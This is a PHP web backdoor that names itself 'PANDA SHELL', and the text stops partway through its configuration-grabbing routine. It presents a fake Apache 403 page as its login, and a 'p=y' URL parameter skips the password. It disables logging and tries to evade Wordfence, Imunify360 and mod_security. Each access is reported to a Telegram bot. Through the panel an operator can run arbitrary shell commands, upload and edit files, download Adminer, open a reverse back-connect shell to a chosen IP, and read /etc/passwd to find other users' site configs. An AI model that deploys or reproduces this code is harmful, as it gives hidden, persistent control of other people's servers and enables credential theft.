<?php 
 error_reporting(0);
 set_time_limit(0);
 $pass = '2d9aac452a370f9687f5d980b2751710';
 session_start(); function login(){ $server = $_SERVER['HTTP_HOST']; die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>403 Forbidden</title> </head><body> <h1>Forbidden</h1> <p>You don't have permission to access this resource.</p> <hr> <address>Apache/2.4.41 (Ubuntu) Server at $server Port 80</address> </body></html> <style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style> <pre align=center> <form method=post> <input type=password name=pass> </form></pre>"); } $disable_functions = @ini_get('disable_functions'); if(!isset($_SESSION['kucing'])) { if((md5($_POST['pass']) === $pass)||$_GET['p']==='y'){ $_SESSION['kucing'] = true; }else{ login(); }}
?><?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}
if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}


$telegramBotToken = 'x';
$telegramChatId = 'x'; 


$sendNotification = true;
if ($telegramBotToken === 'YOUR_BOT_TOKEN_HERE' || $telegramChatId === 'YOUR_CHAT_ID_HERE') {
    $sendNotification = false;
}

if ($sendNotification) {
    $scriptFullPath = __FILE__;
    $serverIp = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (@gethostbyname(@gethostname()) ?: 'N/A');
    $hostname = @gethostname() ?: 'N/A';
    $requestUri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'N/A';
    $remoteAddr = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'N/A';
    $time = date('Y-m-d H:i:s T');

    $message = "🚨 SHELL Accessed!\n\n";
    $message .= "Server: " . htmlspecialchars($serverIp) . " (" . htmlspecialchars($hostname) . ")\n";
    $message .= "Script Path: " . htmlspecialchars($scriptFullPath) . "\n";
    $message .= "Accessed Via: " . htmlspecialchars($requestUri) . "\n";
    $message .= "Client IP: " . htmlspecialchars($remoteAddr) . "\n";
    $message .= "Time: " . $time;

    $apiUrl = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
    $params = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'disable_web_page_preview' => true
    ];
    $url = $apiUrl . '?' . http_build_query($params);
    $response = @file_get_contents($url);
}




function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = rtrim($path, '/') . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(@filesize($itemPath)),
                'permission' => substr(sprintf('%o', @fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        usort($folders, function($a, $b) { return strcmp($a['name'], $b['name']); });
        usort($files, function($a, $b) { return strcmp($a['name'], $b['name']); });

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}
function formatSize($size)
{
    if ($size === false || $size < 0) return 'N/A';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $fullCommand = "cd " . escapeshellarg($currentDirectory) . " && " . $command;

    $output = '';
    $error = '';
    $returnValue = -1;

    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $process = @proc_open($fullCommand, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = @stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = @stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $returnValue = proc_close($process);

            $output = trim($output);
            $error = trim($error);

            if ($returnValue === 0) {
                return !empty($output) ? $output : '(Command executed successfully, no output)';
            } elseif (!empty($error)) {
                return 'Error (' . $returnValue . '): ' . $error . (!empty($output) ? "\nOutput: " . $output : '');
            } else {
                 return 'Error (' . $returnValue . '): Command failed.' . (!empty($output) ? "\nOutput: " . $output : '');
            }
        }
    }

    if (function_exists('shell_exec') && $returnValue !== 0) {
        $shellOutput = @shell_exec($fullCommand);
        if ($shellOutput !== null) {
             $output = trim($shellOutput);
             return !empty($output) ? $output : '(Command executed, no output via shell_exec)';
        }
    }

    if (function_exists('exec') && $returnValue !== 0) {
        $execOutput = [];
        @exec($fullCommand, $execOutput, $execStatus);
        if ($execStatus === 0) {
            $output = implode("\n", $execOutput);
            return !empty($output) ? $output : '(Command executed successfully, no output via exec)';
        } else {
            $output = implode("\n", $execOutput);
            return 'Error (' . $execStatus . ') via exec.' . (!empty($output) ? "\nOutput: " . $output : '');
        }
    }

    if (function_exists('passthru') && $returnValue !== 0) {
        ob_start();
        @passthru($fullCommand, $passthruStatus);
        $passthruOutput = ob_get_clean();
        if ($passthruStatus === 0) {
            $output = trim($passthruOutput);
            return !empty($output) ? $output : '(Command executed successfully, no output via passthru)';
        } else {
             $output = trim($passthruOutput);
             return 'Error (' . $passthruStatus . ') via passthru.' . (!empty($output) ? "\nOutput: " . $output : '');
        }
    }

    if (function_exists('system') && $returnValue !== 0) {
        ob_start();
        @system($fullCommand, $systemStatus);
        $systemOutput = ob_get_clean();
        if ($systemStatus === 0) {
            $output = trim($systemOutput);
             return !empty($output) ? $output : '(Command executed successfully, no output via system)';
        } else {
            $output = trim($systemOutput);
             return 'Error (' . $systemStatus . ') via system.' . (!empty($output) ? "\nOutput: " . $output : '');
        }
    }

    return 'Error: Command execution failed. All methods attempted or disabled.';
}
function readFileContent($file)
{
    if (realpath($file) === __FILE__) {
        return 'Error: Access denied.';
    }
    $content = @file_get_contents($file);
    if ($content === false) {
        return 'Error: Could not read file. Check permissions or path.';
    }
    return $content;
}

function saveFileContent($file)
{
    if (realpath($file) === __FILE__) {
        return false;
    }
    if (isset($_POST['content'])) {
        return @file_put_contents($file, $_POST['content'], LOCK_EX) !== false;
    }
    return false;
}
function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
            switch ($_FILES['file']['error']) {
                case UPLOAD_ERR_INI_SIZE:
                case UPLOAD_ERR_FORM_SIZE:
                    return 'Error: File too large.';
                case UPLOAD_ERR_PARTIAL:
                    return 'Error: File partially uploaded.';
                case UPLOAD_ERR_NO_FILE:
                    return 'Error: No file selected.';
                default:
                    return 'Error: Unknown upload error.';
            }
        }

        if ($_FILES['file']['size'] === 0) {
             return 'Error: Empty file uploaded.';
        }

        $targetFile = rtrim($targetDirectory, '/') . '/' . basename($_FILES['file']['name']);

        if (strpos(basename($_FILES['file']['name']), '/') !== false || strpos(basename($_FILES['file']['name']), '\\') !== false) {
            return 'Error: Invalid filename.';
        }

        if (realpath($targetFile) === __FILE__) {
            return 'Error: Cannot overwrite the shell itself.';
        }

        if (@move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully: ' . htmlspecialchars(basename($_FILES['file']['name']));
        } else {
            $error = error_get_last();
            return 'Error uploading file. ' . ($error ? htmlspecialchars($error['message']) : 'Check permissions or path.');
        }
    }
    return '';
}
function changeDirectory($path)
{
    $path = str_replace('\\', '/', $path);
    $realRequestedPath = realpath(getCurrentDirectory() . '/' . $path);

    if ($realRequestedPath === false) {
        if ($path === '..') {
            @chdir('..');
        } else {
             if (@chdir($path)) {
                 // Success
             } else {
                 // Failed
             }
        }
    } else {
        @chdir($realRequestedPath);
    }
}
function getCurrentDirectory()
{
    return str_replace('\\', '/', getcwd());
}
function getLink($path, $name)
{
    $encodedPath = urlencode($path);
    $encodedName = htmlspecialchars($name);

    if (is_dir($path)) {
        return '<a href="?dir=' . $encodedPath . '">' . $encodedName . '</a>';
    } elseif (is_file($path)) {
        // File link: triggers the combined read/edit view
        $encodedDir = urlencode(dirname($path));
        return '<a href="?dir=' . $encodedDir . '&amp;read=' . $encodedPath . '">' . $encodedName . '</a>';
    } else {
        return $encodedName;
    }
}
function getDirectoryArray($path)
{
    $path = str_replace('\\', '/', $path);
    if (strlen($path) > 1) {
        $path = rtrim($path, '/');
    }
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';

    if ($path === '/' || empty($path)) {
         $directoryArray[] = ['path' => '/', 'name' => '/'];
         return $directoryArray;
    }

     $basePath = ($directories[0] === '') ? '/' : '';

    foreach ($directories as $index => $directory) {
        if ($directory === '' && $index === 0) {
            $currentPath = '/';
            $directoryArray[] = ['path' => $currentPath,'name' => '/'];
             continue;
        }
         if (!empty($directory)) {
             if ($currentPath === '/') {
                  $currentPath .= $directory;
             } elseif ($currentPath === '') {
                 $currentPath = $directory;
             } else {
                  $currentPath .= '/' . $directory;
             }
             $directoryArray[] = ['path' => $currentPath,'name' => $directory];
         }
    }
     if (count($directoryArray) > 0 && $directoryArray[0]['name'] !== '/') {
         array_unshift($directoryArray, ['path' => '/', 'name' => '/']);
     } elseif (empty($directoryArray)) {
          $directoryArray[] = ['path' => '/', 'name' => '/'];
     }

    return $directoryArray;
}
function showBreadcrumb($path)
{
    $pathSegments = getDirectoryArray($path);
    ?>
    <div class="breadcrumb">
        DIR :
        <?php foreach ($pathSegments as $index => $segment) { ?>
            <?php $encodedPath = urlencode($segment['path']); ?>
            <?php $displayName = htmlspecialchars($segment['name']); ?>
            <?php if ($segment['name'] === '/') $displayName = '/'; ?>
            <a href="?dir=<?php echo $encodedPath; ?>"><?php echo $displayName; ?></a><?php if ($index < count($pathSegments) - 1 && count($pathSegments) > 1 && $segment['name'] !== '/') { echo '/'; } ?>
        <?php } ?>
    </div>
    <?php
}
function showFileTable($path)
{
    $fileDetails = @getFileDetails($path);
    ?>
    <table>
        <thead> <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody> <?php if (is_array($fileDetails) && !empty($fileDetails)) { ?>
            <?php foreach ($fileDetails as $fileDetail) { ?>
                <?php $itemFullPath = rtrim($path, '/') . '/' . $fileDetail['name']; ?>
                <tr>
                    <td>
                        <?php if ($fileDetail['type'] === 'Folder') : ?>
                        <svg style="width: 16px; height: 16px; margin-right: 5px; vertical-align: middle;" viewBox="0 0 24 24" fill="currentColor"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"></path></svg>
                        <?php else : ?>
                        <svg style="width: 16px; height: 16px; margin-right: 5px; vertical-align: middle;" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path></svg>
                        <?php endif; ?>
                        <?php echo getLink($itemFullPath, $fileDetail['name']); // This now links files to the read/edit view ?>
                    </td>
                    <td><?php echo htmlspecialchars($fileDetail['type']); ?></td>
                    <td><?php echo htmlspecialchars($fileDetail['size']); ?></td>
                    <td>
                        <?php $isWritable = @is_writable($itemFullPath); $permissionColor = $isWritable ? 'green' : 'red'; ?>
                        <span style="color: <?php echo $permissionColor; ?>"><?php echo htmlspecialchars($fileDetail['permission']); ?></span> <?php echo $isWritable ? '(W)' : ''; ?>
                    </td>
                    <td>
                        <?php $encodedPath = urlencode($path); ?>
                        <?php $encodedItemPath = urlencode($itemFullPath); ?>
                        <?php $encodedItemName = urlencode($fileDetail['name']); ?>
                        <div class="dropdown">
                            <select onchange="handleActionChange(this, '<?php echo $encodedPath; ?>', '<?php echo $encodedItemPath; ?>', '<?php echo $encodedItemName; ?>');">
                                <option value="" selected disabled>Action</option>
                                <option value="rename">Rename</option>
                                <option value="delete" style="color: red;">Delete</option>
                            </select>
                        </div>
                    </td>
                </tr>
            <?php } ?>
        <?php } elseif ($fileDetails === 'None') { ?>
             <tr> <td colspan="5" style="color: red;">Error: Failed to scan directory. Check permissions.</td> </tr>
        <?php } else { ?>
             <tr> <td colspan="5">Directory is empty.</td> </tr>
        <?php } ?>
        </tbody>
    </table>
    <script>
        function handleActionChange(selectElement, currentDirEncoded, itemPathEncoded, itemNameEncoded) {
            const action = selectElement.value;
            if (!action) return;
            const currentDir = decodeURIComponent(currentDirEncoded);
            const itemPath = decodeURIComponent(itemPathEncoded);
            const itemName = decodeURIComponent(itemNameEncoded);
            selectElement.selectedIndex = 0;
            switch (action) {
                case 'rename':
                    const newName = prompt('Enter new name for "' + itemName + '":', itemName);
                    if (newName && newName !== itemName && newName.trim() !== '') {
                        const formData = new FormData();
                        formData.append('new_name', newName.trim());
                        const postUrl = '?dir=' + currentDirEncoded + '&rename=' + itemPathEncoded;
                        fetch(postUrl, { method: 'POST', body: formData })
                            .then(response => {
                                if (response.redirected || response.ok) { window.location.reload(); }
                                else { return response.text().then(text => { throw new Error('Rename failed: ' + text); }); }
                            })
                            .catch(error => { console.error('Rename Error:', error); alert('Rename failed. Check console or permissions.'); });
                    }
                    break;
                case 'delete':
                    const deleteUrl = '?dir=' + currentDirEncoded + '&delete=' + itemPathEncoded;
                    fetch(deleteUrl)
                        .then(response => {
                            if (response.redirected || response.ok) { window.location.reload(); }
                            else { return response.text().then(text => { throw new Error('Delete failed: ' + text); }); }
                        })
                        .catch(error => { console.error('Delete Error:', error); alert('Delete failed. Check console or permissions.'); });
                    break;
                default: console.warn('Unhandled action:', action); break;
            }
        }
    </script>
    <?php
}
function changePermission($itemPath, $permissionInput)
{
    if (!file_exists($itemPath)) { return 'Error: File or directory does not exist.'; }
    if (!preg_match('/^[0-7]{3,4}$/', $permissionInput)) { return 'Error: Invalid permission format. Use 3 or 4 octal digits (e.g., 0755, 755).'; }
    $parsedPermission = @octdec($permissionInput);
    if ($parsedPermission === false) { return 'Error: Invalid permission value.'; }
    $isRecursive = is_dir($itemPath);
    if ($isRecursive) {
         if (chmodRecursive($itemPath, $parsedPermission)) { return 'Permission changed recursively for ' . basename($itemPath) . ' to ' . sprintf('%o', $parsedPermission) . '.'; }
         else { return 'Error changing permission recursively for ' . basename($itemPath) . '.'; }
    } else {
         if (@chmod($itemPath, $parsedPermission)) { return 'Permission changed for ' . basename($itemPath) . ' to ' . sprintf('%o', $parsedPermission) . '.'; }
         else { return 'Error changing permission for ' . basename($itemPath) . '.'; }
    }
}
function chmodRecursive($path, $permission)
{
    if (!@chmod($path, $permission)) { error_log("chmodRecursive: Failed to chmod dir $path"); return false; }
    $items = @scandir($path);
    if ($items === false) { error_log("chmodRecursive: Failed to scandir $path"); return false; }
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') { continue; }
        $itemPath = $path . '/' . $item;
        if (is_dir($itemPath)) { if (!chmodRecursive($itemPath, $permission)) { return false; } }
        else { if (!@chmod($itemPath, $permission)) { error_log("chmodRecursive: Failed to chmod file $itemPath"); return false; } }
    }
    return true;
}
function renameFile($oldPath, $newNameRaw)
{
    if (!file_exists($oldPath)) { return 'Error: File or folder does not exist.'; }
    $newName = basename($newNameRaw);
    if (empty($newName) || $newName === '.' || $newName === '..') { return 'Error: Invalid new name.'; }
    $directory = dirname($oldPath);
    $newPath = $directory . '/' . $newName;
    if (realpath($oldPath) === realpath($newPath)) { return 'Error: New name is the same as the old name.'; }
    if (realpath($newPath) === __FILE__) { return 'Error: Cannot rename to the shell script name.'; }
    if (@rename($oldPath, $newPath)) { return 'File or folder renamed successfully to ' . htmlspecialchars($newName) . '.'; }
    else { $error = error_get_last(); return 'Error renaming file or folder. ' . ($error ? htmlspecialchars($error['message']) : 'Check permissions.'); }
}
function deleteFile($filePath)
{
    if (!is_file($filePath)) { return 'Error: File does not exist or is not a file.'; }
    if (realpath($filePath) === __FILE__) { return 'Error: Cannot delete the shell script itself.'; }
    if (@unlink($filePath)) { return 'File "' . htmlspecialchars(basename($filePath)) . '" deleted successfully.'; }
    else { $error = error_get_last(); return 'Error deleting file. ' . ($error ? htmlspecialchars($error['message']) : 'Check permissions.'); }
}
function deleteFolder($folderPath)
{
    if (!is_dir($folderPath)) { return 'Error: Folder does not exist or is not a directory.'; }
    if (realpath($folderPath) === realpath(dirname(__FILE__))) { return 'Error: Cannot delete the directory containing the shell.'; }
    $criticalDirs = ['/', '/etc', '/bin', '/sbin', '/usr', '/var', '/tmp'];
    if (in_array(realpath($folderPath), $criticalDirs)) { return 'Error: Deleting this critical directory is blocked.'; }
    try {
        $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($folderPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST );
        foreach ($files as $fileinfo) {
            $action = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            if (!@$action($fileinfo->getRealPath())) { $error = error_get_last(); throw new Exception('Failed to delete ' . $fileinfo->getRealPath() . '. ' . ($error ? $error['message'] : '')); }
        }
        if (@rmdir($folderPath)) { return 'Folder "' . htmlspecialchars(basename($folderPath)) . '" deleted successfully.'; }
        else { $error = error_get_last(); throw new Exception('Failed to delete the main folder ' . basename($folderPath) . '. ' . ($error ? $error['message'] : '')); }
    } catch (Exception $e) { return 'Error deleting folder: ' . htmlspecialchars($e->getMessage()); }
}

// --- Global Variables & Request Handling ---
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';
$cmdOutput = '';
$content = '';

if (isset($_GET['dir'])) {
    $requestedDir = trim($_GET['dir']);
    changeDirectory($requestedDir);
    $currentDirectory = getCurrentDirectory();
}

// --- Action Handling (Order can matter) ---

if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd'])) {
    $cmdOutput = executeCommand($_POST['cmd']);
    $cmdOutput = "[ Executing: " . htmlspecialchars($_POST['cmd']) . " ]\n" . $cmdOutput;
}

// Handle Edit Action (Save Only - Loading/Display is now handled by 'read')
if (isset($_GET['edit']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
    $fileToEdit = $_GET['edit'];
    if (saveFileContent($fileToEdit)) {
        $responseMessage = 'File "' . htmlspecialchars(basename($fileToEdit)) . '" saved successfully.';
        header('Location: ?dir=' . urlencode(dirname($fileToEdit)) . '&response=' . urlencode($responseMessage));
        exit;
    } else {
        $errorMessage = 'Error saving file "' . htmlspecialchars(basename($fileToEdit)) . '". Check permissions.';
         header('Location: ?dir=' . urlencode(dirname($fileToEdit)) . '&read=' . urlencode($fileToEdit) . '&error=' . urlencode($errorMessage));
         exit;
    }
}

// Note: This section is still present but won't be triggered by the simplified UI dropdown
if (isset($_GET['chmod'])) {
     $itemToChmod = $_GET['chmod'];
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
         $permissionInput = trim($_POST['permission']);
         $responseMessage = changePermission($itemToChmod, $permissionInput);
          $redirectUrl = '?dir=' . urlencode(dirname($itemToChmod));
          $redirectUrl .= ($responseMessage && strpos($responseMessage, 'Error:') !== 0) ? '&response=' . urlencode($responseMessage) : '&error=' . urlencode($responseMessage ?: 'Unknown chmod error.');
          header('Location: ' . $redirectUrl);
          exit;
     } elseif (!file_exists($itemToChmod)) {
          $errorMessage = 'Error: File or folder specified for chmod does not exist.';
     }
}

// Handle Rename Action (Triggered by JS Fetch POST now)
if (isset($_GET['rename'])) {
    $itemToRename = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
        $newNameRaw = trim($_POST['new_name']);
        $responseMessage = renameFile($itemToRename, $newNameRaw);
         $redirectUrl = '?dir=' . urlencode(dirname($itemToRename));
          $redirectUrl .= ($responseMessage && strpos($responseMessage, 'Error:') !== 0) ? '&response=' . urlencode($responseMessage) : '&error=' . urlencode($responseMessage ?: 'Unknown rename error.');
          header('Location: ' . $redirectUrl);
          exit;
    } elseif (!file_exists($itemToRename)) {
           header('Location: ?dir=' . urlencode(dirname($itemToRename)) . '&error=' . urlencode('Error: File or folder specified for rename does not exist.'));
           exit;
     }
}

// Handle Delete Action (Triggered by JS Fetch GET now)
if (isset($_GET['delete'])) {
    $itemToDelete = $_GET['delete'];
    $itemDir = dirname($itemToDelete);
    if (is_file($itemToDelete)) { $responseMessage = deleteFile($itemToDelete); }
    elseif (is_dir($itemToDelete)) { $responseMessage = deleteFolder($itemToDelete); }
    else { $responseMessage = 'Error: File or folder does not exist.'; }
     $redirectUrl = '?dir=' . urlencode($itemDir);
     $redirectUrl .= (strpos($responseMessage, 'Error:') !== 0) ? '&response=' . urlencode($responseMessage) : '&error=' . urlencode($responseMessage);
     header('Location: ' . $redirectUrl);
     exit;
}

if (isset($_POST['Summon'])) {
    $adminerUrl = 'https://github.com/vrana/adminer/releases/download/v5.4.1/adminer-5.4.1.php';
    $adminerFileName = 'adminer-5.4.1.php';
    $adminerFilePath = rtrim($currentDirectory, '/') . '/' . $adminerFileName;
    if (!is_writable($currentDirectory)) { $errorMessage = 'Error: Cannot write to current directory. Check permissions.'; }
    else {
        $adminerContent = @file_get_contents($adminerUrl);
        if ($adminerContent !== false) {
            if (@file_put_contents($adminerFilePath, $adminerContent) !== false) { $responseMessage = 'Adminer "' . htmlspecialchars($adminerFileName) . '" summoned successfully. <a href="' . htmlspecialchars($adminerFileName) . '" target="_blank">Open Adminer</a>'; @chmod($adminerFilePath, 0644); }
            else { $errorMessage = 'Failed to save the summoned Adminer file. Check permissions.'; }
        } else {
             if (function_exists('curl_init')) {
                  $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $adminerUrl); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                  $adminerContentCurl = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
                  if ($httpCode == 200 && $adminerContentCurl !== false) {
                       if (@file_put_contents($adminerFilePath, $adminerContentCurl) !== false) { $responseMessage = 'Adminer "' . htmlspecialchars($adminerFileName) . '" summoned via CURL successfully. <a href="' . htmlspecialchars($adminerFileName) . '" target="_blank">Open Adminer</a>'; @chmod($adminerFilePath, 0644); }
                       else { $errorMessage = 'Failed to save the summoned Adminer file (via CURL). Check permissions.'; }
                  } else { $errorMessage = 'Failed to fetch Adminer content using file_get_contents and CURL. Check server connectivity, allow_url_fopen/CURL extension, and target URL.'; }
             } else { $errorMessage = 'Failed to fetch Adminer content. `allow_url_fopen` might be disabled, and CURL is not available.'; }
        }
    }
}

// Handle Back Connect (Bind Shell)
// Note: This is a very dangerous feature. Use with extreme caution.
if (isset($_POST['bind']) && isset($_POST['ip']) && isset($_POST['port'])) {
    $ip = trim($_POST['ip']);
    $port = filter_var(trim($_POST['port']), FILTER_VALIDATE_INT);
    if (!$port || $port <= 0 || $port > 65535) { $errorMessage = '<p style="color: red;">Invalid port number.</p>'; }
    elseif (!filter_var($ip, FILTER_VALIDATE_IP)) { $errorMessage = '<p style="color: red;">Invalid IP address format.</p>'; }
    else {
        $errorMessage = '<p>Attempting Connection to ' . htmlspecialchars($ip) . ':' . htmlspecialchars($port) . '...</p>';
        $sockfd = @fsockopen($ip, $port, $errno, $errstr, 10);
        if (!$sockfd) { $errorMessage .= "<p style='color: red;'>Connection failed: ($errno) $errstr</p>"; }
        else {
             @fputs($sockfd, "{################################################################}\n");
             @fputs($sockfd, "..:: PHP Backconnect Shell via PANDA SHELL ::..\n");
             @fputs($sockfd, " User: " . @get_current_user() . " | System: " . @php_uname('s') . " " . @php_uname('r') . "\n");
             @fputs($sockfd, " Time: " . date('Y-m-d H:i:s T') . "\n");
             @fputs($sockfd, "{################################################################}\n\n");
             $len = 4096; $cwd = getCurrentDirectory();
             while (!feof($sockfd)) {
                  @fputs($sockfd, '[' . @get_current_user() . '@' . @gethostname() . ' ' . basename($cwd) . ']$ ');
                  $command = @fgets($sockfd, $len); if ($command === false) break; $command = trim($command); if (empty($command)) continue;
                  if (preg_match('/^cd\s+(.*)/i', $command, $matches)) {
                      $newDir = trim($matches[1]); if ($newDir === '') $newDir = '~';
                       if ($newDir === '~' || strpos($newDir, '~/') === 0) {
                            $home = getenv('HOME'); if ($home) { $newDir = $home . ($newDir === '~' ? '' : substr($newDir, 1)); }
                            else { @fputs($sockfd, "Error: Could not resolve home directory (HOME env var not set).\n"); continue; }
                       }
                      if (@chdir($newDir)) { $cwd = getCurrentDirectory(); @fputs($sockfd, "Changed directory to: " . $cwd . "\n"); }
                      else { @fputs($sockfd, "Error: Could not change directory to '" . htmlspecialchars($newDir) . "'.\n"); }
                  } else { $cmdOutputBC = executeCommand($command); @fputs($sockfd, $cmdOutputBC . "\n"); }
             }
             @fclose($sockfd); $responseMessage = "<p style='color: green;'>Backconnect session terminated.</p>";
        }
    }
}

if (isset($_POST['create_file']) && isset($_GET['create']) && $_GET['create'] === 'file') {
    $fileNameRaw = trim($_POST['file_name']); $fileName = basename($fileNameRaw);
    if (empty($fileName) || $fileName === '.' || $fileName === '..') { $errorMessage = 'Error: Invalid file name.'; }
    else {
        $filePath = rtrim($currentDirectory, '/') . '/' . $fileName;
         if (realpath($filePath) === __FILE__) { $errorMessage = 'Error: Cannot create file with the same name as the shell.'; }
         elseif (file_exists($filePath)) { $errorMessage = 'Error: File "' . htmlspecialchars($fileName) . '" already exists.'; }
         else { if (@touch($filePath)) { @chmod($filePath, 0644); $responseMessage = 'File created successfully: ' . htmlspecialchars($fileName); }
                else { $error = error_get_last(); $errorMessage = 'Error: Failed to create file. ' . ($error ? htmlspecialchars($error['message']) : 'Check permissions.'); }
        }
    }
}

if (isset($_POST['create_folder']) && isset($_GET['create']) && $_GET['create'] === 'folder') {
    $folderNameRaw = trim($_POST['folder_name']); $folderName = basename($folderNameRaw);
    if (empty($folderName) || $folderName === '.' || $folderName === '..') { $errorMessage = 'Error: Invalid folder name.'; }
    else {
        $folderPath = rtrim($currentDirectory, '/') . '/' . $folderName;
        if (file_exists($folderPath)) { $errorMessage = 'Error: Folder "' . htmlspecialchars($folderName) . '" already exists.'; }
        else { if (@mkdir($folderPath, 0755)) { $responseMessage = 'Folder created successfully: ' . htmlspecialchars($folderName); }
               else { $error = error_get_last(); $errorMessage = 'Error: Failed to create folder. ' . ($error ? htmlspecialchars($error['message']) : 'Check permissions.'); }
        }
    }
}

// Handle Config Grabbing ('goo=config') - DANGEROUS FEATURE
if (isset($_GET['goo']) && $_GET['goo'] == 'config') {
    $configDirName = "MH_configs_" . date('YmdHis'); $configDirPath = rtrim($currentDirectory, '/') . '/' . $configDirName; $configFilesFound = [];
    $passwdPath = "/etc/passwd";
    if (!is_readable($passwdPath)) { $errorMessage = "<pre><font color=red>Error: Can't read /etc/passwd. Config grabbing aborted.</font></pre>"; }
    else {
        if (!@mkdir($configDirPath, 0755)) { $error = error_get_last(); $errorMessage = "<pre><font color=red>Error: Failed to create config directory '$configDirName'. " . ($error ? htmlspecialchars($error['message']) : 'Check permissions.') . "</font></pre>"; }
        else {
             $htaccessContent = "Options -Indexes\nDeny from all\n"; @file_put_contents($configDirPath . '/.htaccess', $htaccessContent);
             $responseMessage = "<p>Starting config scan... Results will be in <a href='?dir=" . urlencode($configDirPath) . "'>" . htmlspecialchars($configDirName) . "</a></p>";
             $etc = @fopen($passwdPath, "r");
             if (!$etc) { $errorMessage = "<pre><font color=red>Error: Failed to open /etc/passwd after initial read check.</font></pre>"; }
             else {
                  while (($passwdLine = fgets($etc)) !== false) {
                      $passwdLine = trim($passwdLine); if (empty($passwdLine) || strpos($passwdLine, ':x:') === false) continue;
                      if (preg_match('/^([^:]+):x:/', $passwdLine, $userMatches)) {
                          $username = $userMatches[1]; $homeDirGuess = "/home/$username";
                          $webRootGuesses = [ "$homeDirGuess/public_html", "$homeDirGuess/www", "$homeDirGuess/htdocs", ];
